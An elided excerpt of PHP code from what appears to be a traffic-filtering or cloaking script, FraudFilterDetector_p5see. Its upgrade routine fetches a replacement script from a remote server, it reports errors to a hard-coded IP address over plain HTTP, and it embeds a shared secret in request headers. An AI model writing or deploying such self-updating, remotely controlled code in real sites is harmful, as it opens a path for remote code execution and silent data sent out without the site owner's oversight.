...
class FraudFilterDetector_p5see {
    ...
    function isSignatureValid($sign, $time) {
        $str = '7f8e686e-7359-4c7c-8a81-a83353231619.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 7f8e686e-7359-4c7c-8a81-a83353231619',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 7f8e686e-7359-4c7c-8a81-a83353231619';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 7f8e686e-7359-4c7c-8a81-a83353231619';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=p5see&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_p5see = new FraudFilterDetector_p5see();
$fraudFilterDetector_p5see->check();
